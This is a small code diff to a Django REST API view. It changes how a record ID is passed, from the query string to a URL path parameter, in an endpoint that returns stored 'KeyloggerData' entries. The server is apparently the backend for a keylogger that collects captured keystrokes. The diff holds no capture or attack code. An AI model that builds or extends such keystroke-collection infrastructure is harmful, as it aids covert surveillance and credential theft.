@@ -34,6 +34,6 @@ class CreateId(APIView):
         return Response(serializer.data)
 
 class GetDataById(APIView):
-    def get(self, request):
-        serializer = GetDataSerializer(KeyloggerData.objects.filter(keylogger_ref = request.GET['pk']), many=True)
+    def get(self, request, pk):
+        serializer = GetDataSerializer(KeyloggerData.objects.filter(keylogger_ref = pk), many=True)
         return Response(serializer.data)
